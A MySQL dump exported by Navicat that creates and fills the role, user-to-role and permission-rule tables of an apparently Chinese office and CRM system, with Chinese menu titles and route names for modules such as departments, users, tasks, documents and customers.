/*
Navicat MySQL Data Transfer

Source Server         : localhost_3306
Source Server Version : 50553
Source Host           : localhost:3306
Source Database       : store

Target Server Type    : MYSQL
Target Server Version : 50553
File Encoding         : 65001

Date: 2018-03-14 16:17:08
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for `xy_auth_group`
-- ----------------------------
DROP TABLE IF EXISTS `xy_auth_group`;
CREATE TABLE `xy_auth_group` (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `type` tinyint(1) NOT NULL,
  `title` char(50) NOT NULL,
  `level` int(2) NOT NULL,
  `pid` int(4) NOT NULL,
  `sort` int(4) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `rules` varchar(2000) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=24 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_auth_group
-- ----------------------------
INSERT INTO `xy_auth_group` VALUES ('1', '0', 'boss', '0', '0', '1', '1', '2');
INSERT INTO `xy_auth_group` VALUES ('5', '1', '系统管理员', '1', '1', '1', '1', '309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,403,365,366,402,367,368,369,370,371,372,373,374,375,376,377,404,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,398,396,397,405,399,401,400,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,441,427,428,429,430,431,432,436,433,434,435,437,438,439,440,442,443,444,445,446,447,451,448,449,450,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,472,470,471,473,474,475,476,477,478,480,479,481,482,483,484,485,486,487,488,292,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,1,2,5,3,4,6,7,8,9,10,11,12,13,14,15,16,17,58,18,19,20,21,22,23,56,24,261,262,263,264,265,266,25,26,27,28,57,29,30,31,32,33,34,35,36,247,61,60,37,38,59,39,40,41');
INSERT INTO `xy_auth_group` VALUES ('6', '1', '仓库管理员', '1', '1', '2', '1', '309,310,311,312,313,316,317,318,319,320,321,324,325,326,327,330,331,332,333,335,336,337,338,341,342,343,344,345,346,349,350,351,352,353,354,355,356,359,360,361,362,403,365,366,402,367,368,369,370,371,372,373,376,377,404,378,379,380,381,384,385,386,387,390,391,392,393,398,396,397,405,537,399,401,406,407,408,409,412,413,414,415,416,419,420,421,422,423,426,441,427,428,429,430,436,433,434,435,437,438,439,440,442,443,444,445,451,448,449,450,452,453,454,455,456,457,458,459,462,463,464,465,466,467,472,470,471,473,474,475,476,480,479,481,482,483,484,485,488,490,532,533,535,536,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,295,296,297,298,299,301,302,303,304,306,307,308,5,3,4,6,7,9,10,11,12,13,15,16,17,58,18,19,21,22,23,262,263,264,36,247,61,60,38,59,40,41');
INSERT INTO `xy_auth_group` VALUES ('7', '1', '市场经理', '1', '15', '3', '1', '267,268,269,286,287,280,281,58');
INSERT INTO `xy_auth_group` VALUES ('14', '0', '财务部', '0', '0', '2', '1', '');
INSERT INTO `xy_auth_group` VALUES ('15', '0', '市场部', '0', '0', '3', '1', '309,310,311,312,313,318,319,320,321,324,325,326,327,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,353,354,359,360,361,362,363,364,403,365,366,402,367,368,369,370,371,372,373,374,376,377,404,378,379,380,381,384,385,386,387,390,391,392,393,394,398,397,405,537,399,401,406,407,408,409,412,413,414,415,418,490,532,533,491,492,493,494,496,498,499,500,501,502,503,504,505,506,517,518,521,522,523,526,527,528,531,292,294,295,305,306');
INSERT INTO `xy_auth_group` VALUES ('16', '0', '技术部', '0', '0', '4', '1', '309,310,311,312,313,318,319,320,321,324,325,326,327,335,336,337,338,339,340,341,342,343,344,345,346,348,349,350,351,353,354,359,360,361,362,363,364,403,365,366,402,367,368,369,413,414,415,418,292,294,295');

-- ----------------------------
-- Table structure for `xy_auth_group_access`
-- ----------------------------
DROP TABLE IF EXISTS `xy_auth_group_access`;
CREATE TABLE `xy_auth_group_access` (
  `uid` mediumint(8) NOT NULL,
  `group_id` mediumint(8) NOT NULL,
  KEY `uid` (`uid`),
  KEY `group_id` (`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_auth_group_access
-- ----------------------------
INSERT INTO `xy_auth_group_access` VALUES ('1', '5');
INSERT INTO `xy_auth_group_access` VALUES ('1', '1');
INSERT INTO `xy_auth_group_access` VALUES ('15', '20');
INSERT INTO `xy_auth_group_access` VALUES ('15', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '5');
INSERT INTO `xy_auth_group_access` VALUES ('14', '15');
INSERT INTO `xy_auth_group_access` VALUES ('14', '18');
INSERT INTO `xy_auth_group_access` VALUES ('13', '15');
INSERT INTO `xy_auth_group_access` VALUES ('13', '18');
INSERT INTO `xy_auth_group_access` VALUES ('12', '15');
INSERT INTO `xy_auth_group_access` VALUES ('12', '18');
INSERT INTO `xy_auth_group_access` VALUES ('11', '15');
INSERT INTO `xy_auth_group_access` VALUES ('11', '7');
INSERT INTO `xy_auth_group_access` VALUES ('10', '15');
INSERT INTO `xy_auth_group_access` VALUES ('10', '17');
INSERT INTO `xy_auth_group_access` VALUES ('9', '15');
INSERT INTO `xy_auth_group_access` VALUES ('9', '19');
INSERT INTO `xy_auth_group_access` VALUES ('16', '6');
INSERT INTO `xy_auth_group_access` VALUES ('16', '1');
INSERT INTO `xy_auth_group_access` VALUES ('17', '18');
INSERT INTO `xy_auth_group_access` VALUES ('17', '16');
INSERT INTO `xy_auth_group_access` VALUES ('18', '22');
INSERT INTO `xy_auth_group_access` VALUES ('18', '15');
INSERT INTO `xy_auth_group_access` VALUES ('19', '6');
INSERT INTO `xy_auth_group_access` VALUES ('19', '1');
INSERT INTO `xy_auth_group_access` VALUES ('1', '5');
INSERT INTO `xy_auth_group_access` VALUES ('1', '1');
INSERT INTO `xy_auth_group_access` VALUES ('15', '20');
INSERT INTO `xy_auth_group_access` VALUES ('15', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '5');
INSERT INTO `xy_auth_group_access` VALUES ('14', '15');
INSERT INTO `xy_auth_group_access` VALUES ('14', '18');
INSERT INTO `xy_auth_group_access` VALUES ('13', '15');
INSERT INTO `xy_auth_group_access` VALUES ('13', '18');
INSERT INTO `xy_auth_group_access` VALUES ('12', '15');
INSERT INTO `xy_auth_group_access` VALUES ('12', '18');
INSERT INTO `xy_auth_group_access` VALUES ('11', '15');
INSERT INTO `xy_auth_group_access` VALUES ('11', '7');
INSERT INTO `xy_auth_group_access` VALUES ('10', '15');
INSERT INTO `xy_auth_group_access` VALUES ('10', '17');
INSERT INTO `xy_auth_group_access` VALUES ('9', '15');
INSERT INTO `xy_auth_group_access` VALUES ('9', '19');
INSERT INTO `xy_auth_group_access` VALUES ('16', '6');
INSERT INTO `xy_auth_group_access` VALUES ('16', '1');
INSERT INTO `xy_auth_group_access` VALUES ('17', '18');
INSERT INTO `xy_auth_group_access` VALUES ('17', '16');
INSERT INTO `xy_auth_group_access` VALUES ('18', '22');
INSERT INTO `xy_auth_group_access` VALUES ('18', '15');
INSERT INTO `xy_auth_group_access` VALUES ('19', '6');
INSERT INTO `xy_auth_group_access` VALUES ('19', '1');
INSERT INTO `xy_auth_group_access` VALUES ('1', '5');
INSERT INTO `xy_auth_group_access` VALUES ('1', '1');
INSERT INTO `xy_auth_group_access` VALUES ('15', '20');
INSERT INTO `xy_auth_group_access` VALUES ('15', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '5');
INSERT INTO `xy_auth_group_access` VALUES ('14', '15');
INSERT INTO `xy_auth_group_access` VALUES ('14', '18');
INSERT INTO `xy_auth_group_access` VALUES ('13', '15');
INSERT INTO `xy_auth_group_access` VALUES ('13', '18');
INSERT INTO `xy_auth_group_access` VALUES ('12', '15');
INSERT INTO `xy_auth_group_access` VALUES ('12', '18');
INSERT INTO `xy_auth_group_access` VALUES ('11', '15');
INSERT INTO `xy_auth_group_access` VALUES ('11', '7');
INSERT INTO `xy_auth_group_access` VALUES ('10', '15');
INSERT INTO `xy_auth_group_access` VALUES ('10', '17');
INSERT INTO `xy_auth_group_access` VALUES ('9', '15');
INSERT INTO `xy_auth_group_access` VALUES ('9', '19');
INSERT INTO `xy_auth_group_access` VALUES ('16', '6');
INSERT INTO `xy_auth_group_access` VALUES ('16', '1');
INSERT INTO `xy_auth_group_access` VALUES ('17', '18');
INSERT INTO `xy_auth_group_access` VALUES ('17', '16');
INSERT INTO `xy_auth_group_access` VALUES ('18', '22');
INSERT INTO `xy_auth_group_access` VALUES ('18', '15');
INSERT INTO `xy_auth_group_access` VALUES ('19', '6');
INSERT INTO `xy_auth_group_access` VALUES ('19', '1');
INSERT INTO `xy_auth_group_access` VALUES ('1', '5');
INSERT INTO `xy_auth_group_access` VALUES ('1', '1');
INSERT INTO `xy_auth_group_access` VALUES ('15', '20');
INSERT INTO `xy_auth_group_access` VALUES ('15', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '5');
INSERT INTO `xy_auth_group_access` VALUES ('14', '15');
INSERT INTO `xy_auth_group_access` VALUES ('14', '18');
INSERT INTO `xy_auth_group_access` VALUES ('13', '15');
INSERT INTO `xy_auth_group_access` VALUES ('13', '18');
INSERT INTO `xy_auth_group_access` VALUES ('12', '15');
INSERT INTO `xy_auth_group_access` VALUES ('12', '18');
INSERT INTO `xy_auth_group_access` VALUES ('11', '15');
INSERT INTO `xy_auth_group_access` VALUES ('11', '7');
INSERT INTO `xy_auth_group_access` VALUES ('10', '15');
INSERT INTO `xy_auth_group_access` VALUES ('10', '17');
INSERT INTO `xy_auth_group_access` VALUES ('9', '15');
INSERT INTO `xy_auth_group_access` VALUES ('9', '19');
INSERT INTO `xy_auth_group_access` VALUES ('16', '6');
INSERT INTO `xy_auth_group_access` VALUES ('16', '1');
INSERT INTO `xy_auth_group_access` VALUES ('17', '18');
INSERT INTO `xy_auth_group_access` VALUES ('17', '16');
INSERT INTO `xy_auth_group_access` VALUES ('18', '22');
INSERT INTO `xy_auth_group_access` VALUES ('18', '15');
INSERT INTO `xy_auth_group_access` VALUES ('19', '6');
INSERT INTO `xy_auth_group_access` VALUES ('19', '1');
INSERT INTO `xy_auth_group_access` VALUES ('1', '5');
INSERT INTO `xy_auth_group_access` VALUES ('1', '1');
INSERT INTO `xy_auth_group_access` VALUES ('15', '20');
INSERT INTO `xy_auth_group_access` VALUES ('15', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '5');
INSERT INTO `xy_auth_group_access` VALUES ('14', '15');
INSERT INTO `xy_auth_group_access` VALUES ('14', '18');
INSERT INTO `xy_auth_group_access` VALUES ('13', '15');
INSERT INTO `xy_auth_group_access` VALUES ('13', '18');
INSERT INTO `xy_auth_group_access` VALUES ('12', '15');
INSERT INTO `xy_auth_group_access` VALUES ('12', '18');
INSERT INTO `xy_auth_group_access` VALUES ('11', '15');
INSERT INTO `xy_auth_group_access` VALUES ('11', '7');
INSERT INTO `xy_auth_group_access` VALUES ('10', '15');
INSERT INTO `xy_auth_group_access` VALUES ('10', '17');
INSERT INTO `xy_auth_group_access` VALUES ('9', '15');
INSERT INTO `xy_auth_group_access` VALUES ('9', '19');
INSERT INTO `xy_auth_group_access` VALUES ('16', '6');
INSERT INTO `xy_auth_group_access` VALUES ('16', '1');
INSERT INTO `xy_auth_group_access` VALUES ('17', '18');
INSERT INTO `xy_auth_group_access` VALUES ('17', '16');
INSERT INTO `xy_auth_group_access` VALUES ('18', '22');
INSERT INTO `xy_auth_group_access` VALUES ('18', '15');
INSERT INTO `xy_auth_group_access` VALUES ('19', '6');
INSERT INTO `xy_auth_group_access` VALUES ('19', '1');
INSERT INTO `xy_auth_group_access` VALUES ('1', '5');
INSERT INTO `xy_auth_group_access` VALUES ('1', '1');
INSERT INTO `xy_auth_group_access` VALUES ('15', '20');
INSERT INTO `xy_auth_group_access` VALUES ('15', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '1');
INSERT INTO `xy_auth_group_access` VALUES ('8', '5');
INSERT INTO `xy_auth_group_access` VALUES ('14', '15');
INSERT INTO `xy_auth_group_access` VALUES ('14', '18');
INSERT INTO `xy_auth_group_access` VALUES ('13', '15');
INSERT INTO `xy_auth_group_access` VALUES ('13', '18');
INSERT INTO `xy_auth_group_access` VALUES ('12', '15');
INSERT INTO `xy_auth_group_access` VALUES ('12', '18');
INSERT INTO `xy_auth_group_access` VALUES ('11', '15');
INSERT INTO `xy_auth_group_access` VALUES ('11', '7');
INSERT INTO `xy_auth_group_access` VALUES ('10', '15');
INSERT INTO `xy_auth_group_access` VALUES ('10', '17');
INSERT INTO `xy_auth_group_access` VALUES ('9', '15');
INSERT INTO `xy_auth_group_access` VALUES ('9', '19');
INSERT INTO `xy_auth_group_access` VALUES ('16', '6');
INSERT INTO `xy_auth_group_access` VALUES ('16', '1');
INSERT INTO `xy_auth_group_access` VALUES ('17', '18');
INSERT INTO `xy_auth_group_access` VALUES ('17', '16');
INSERT INTO `xy_auth_group_access` VALUES ('18', '22');
INSERT INTO `xy_auth_group_access` VALUES ('18', '15');
INSERT INTO `xy_auth_group_access` VALUES ('19', '6');
INSERT INTO `xy_auth_group_access` VALUES ('19', '1');
INSERT INTO `xy_auth_group_access` VALUES ('21', '6');
INSERT INTO `xy_auth_group_access` VALUES ('20', '15');
INSERT INTO `xy_auth_group_access` VALUES ('21', '16');

-- ----------------------------
-- Table structure for `xy_auth_rule`
-- ----------------------------
DROP TABLE IF EXISTS `xy_auth_rule`;
CREATE TABLE `xy_auth_rule` (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `level` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `name` char(80) NOT NULL DEFAULT '',
  `title` char(20) NOT NULL DEFAULT '',
  `type` tinyint(1) NOT NULL DEFAULT '1',
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `condition` char(100) NOT NULL DEFAULT '',
  `sort` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=546 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_auth_rule
-- ----------------------------
INSERT INTO `xy_auth_rule` VALUES ('1', '0', '0', 'home/system/index', '系统管理', '1', '1', '', '99');
INSERT INTO `xy_auth_rule` VALUES ('2', '1', '1', 'home/org/', '部门管理', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('3', '2', '2', 'home/org/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('4', '2', '2', 'home/org/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('5', '2', '2', 'home/org/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('6', '2', '2', 'home/org/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('7', '2', '2', 'home/org/editrule', '权限', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('8', '1', '1', 'home/dep', '职位管理', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('9', '2', '8', 'home/dep/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('10', '2', '8', 'home/dep/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('11', '2', '8', 'home/dep/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('12', '2', '8', 'home/dep/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('13', '2', '8', 'home/dep/editrule', '权限', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('14', '1', '1', 'home/user/', '用户管理', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('15', '2', '14', 'home/user/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('16', '2', '14', 'home/user/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('17', '2', '14', 'home/user/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('18', '2', '14', 'home/user/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('19', '2', '14', 'home/user/editrule', '权限', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('20', '1', '1', 'home/config/', '数据字典', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('21', '2', '20', 'home/config/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('22', '2', '20', 'home/config/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('23', '2', '20', 'home/config/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('24', '2', '20', 'home/config/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('25', '1', '1', 'home/menu/', '菜单管理', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('26', '2', '25', 'home/menu/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('27', '2', '25', 'home/menu/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('28', '2', '25', 'home/menu/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('29', '2', '25', 'home/menu/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('30', '1', '1', 'home/rule/', '功能列表', '1', '1', '', '8');
INSERT INTO `xy_auth_rule` VALUES ('31', '2', '30', 'home/rule/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('32', '2', '30', 'home/rule/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('33', '2', '30', 'home/rule/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('34', '2', '30', 'home/rule/del', '删除', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('35', '1', '1', 'home/database', '数据备份', '1', '1', '', '10');
INSERT INTO `xy_auth_rule` VALUES ('36', '2', '35', 'home/database/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('37', '1', '1', 'home/database/', '备份文件', '1', '1', '', '11');
INSERT INTO `xy_auth_rule` VALUES ('38', '2', '37', 'home/database/bakup', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('39', '1', '1', 'home/log', '操作日志', '1', '1', '', '15');
INSERT INTO `xy_auth_rule` VALUES ('40', '2', '39', 'home/log/index', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('41', '2', '39', 'home/log/del', '删除', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('56', '2', '20', 'home/config/lock', '锁定', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('57', '2', '25', 'home/menu/lock', '锁定', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('58', '2', '14', 'home/baoming/lock', '锁定', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('59', '2', '37', 'home/database/del', '删除', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('60', '2', '35', 'home/database/repair', '修复', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('61', '2', '35', 'home/database/optimize', '优化', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('247', '2', '35', 'home/database/export', '备份', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('261', '1', '1', 'home/datalist/index', '分类字典', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('262', '2', '261', 'home/datalist/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('263', '2', '261', 'home/datalist/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('264', '2', '261', 'home/datalist/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('265', '2', '261', 'home/datalist/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('266', '2', '261', 'home/datalist/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('309', '0', '0', 'home/bangong/index', '个人办公', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('310', '1', '309', 'home/quxiang/index', '我的去向', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('311', '2', '310', 'home/quxiang/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('312', '2', '310', 'home/quxiang/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('313', '2', '310', 'home/quxiang/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('314', '2', '310', 'home/quxiang/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('315', '2', '310', 'home/quxiang/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('316', '1', '309', 'home/quxiangs/index', '员工去向', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('317', '2', '316', 'home/quxiangs/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('318', '1', '309', 'home/renwu/index', '我的任务', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('319', '2', '318', 'home/renwu/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('320', '2', '318', 'home/renwu/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('321', '2', '318', 'home/renwu/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('322', '2', '318', 'home/renwu/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('323', '2', '318', 'home/renwu/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('324', '1', '309', 'home/huibao/index', '工作汇报', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('325', '2', '324', 'home/huibao/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('326', '2', '324', 'home/huibao/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('327', '2', '324', 'home/huibao/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('328', '2', '324', 'home/huibao/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('329', '2', '324', 'home/huibao/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('330', '1', '309', 'home/huibaos/index', '批注汇报', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('331', '2', '330', 'home/huibaos/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('332', '2', '330', 'home/huibaos/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('333', '2', '330', 'home/huibaos/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('334', '2', '330', 'home/huibaos/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('335', '1', '309', 'home/wendang/index', '我的文档', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('336', '2', '335', 'home/wendang/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('337', '2', '335', 'home/wendang/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('338', '2', '335', 'home/wendang/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('339', '2', '335', 'home/wendang/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('340', '2', '335', 'home/wendang/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('341', '1', '309', 'home/wendangs/index', '共享文档', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('342', '2', '341', 'home/wendangs/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('343', '1', '309', 'home/zhishi/index', '知识管理', '1', '1', '', '8');
INSERT INTO `xy_auth_rule` VALUES ('344', '2', '343', 'home/zhishi/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('345', '2', '343', 'home/zhishi/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('346', '2', '343', 'home/zhishi/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('347', '2', '343', 'home/zhishi/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('348', '2', '343', 'home/zhishi/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('349', '1', '309', 'home/msg/index', '我的消息', '1', '1', '', '9');
INSERT INTO `xy_auth_rule` VALUES ('350', '2', '349', 'home/msg/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('351', '2', '349', 'home/msg/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('352', '2', '349', 'home/msg/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('353', '1', '309', 'home/tongzhi/index', '通知公告', '1', '1', '', '11');
INSERT INTO `xy_auth_rule` VALUES ('354', '2', '353', 'home/tongzhi/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('355', '2', '353', 'home/tongzhi/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('356', '2', '353', 'home/tongzhi/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('357', '2', '353', 'home/tongzhi/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('358', '2', '353', 'home/tongzhi/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('359', '1', '309', 'home/wdtxl/index', '我的通讯录', '1', '1', '', '12');
INSERT INTO `xy_auth_rule` VALUES ('360', '2', '359', 'home/wdtxl/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('361', '2', '359', 'home/wdtxl/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('362', '2', '359', 'home/wdtxl/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('363', '2', '359', 'home/wdtxl/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('364', '2', '359', 'home/wdtxl/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('365', '1', '309', 'home/ggtxl/index', '公共通讯录', '1', '1', '', '13');
INSERT INTO `xy_auth_rule` VALUES ('366', '2', '365', 'home/ggtxl/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('367', '1', '309', 'home/dwtxl/index', '单位通讯录', '1', '1', '', '15');
INSERT INTO `xy_auth_rule` VALUES ('368', '2', '367', 'home/dwtxl/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('369', '0', '0', 'home/kehu/index', '客户管理', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('370', '1', '369', 'home/cust/index', '潜在客户', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('371', '2', '370', 'home/cust/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('372', '2', '370', 'home/cust/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('373', '2', '370', 'home/cust/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('374', '2', '370', 'home/cust/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('375', '2', '370', 'home/cust/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('376', '2', '370', 'home/cust/daoqi', '待跟踪', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('377', '2', '370', 'home/cust/cheng', '成交客户', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('378', '1', '369', 'home/custcon/index', '联系人', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('379', '2', '378', 'home/custcon/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('380', '2', '378', 'home/custcon/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('381', '2', '378', 'home/custcon/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('382', '2', '378', 'home/custcon/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('383', '2', '378', 'home/custcon/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('384', '1', '369', 'home/custgd/index', '跟单记录', '1', '1', '', '3');
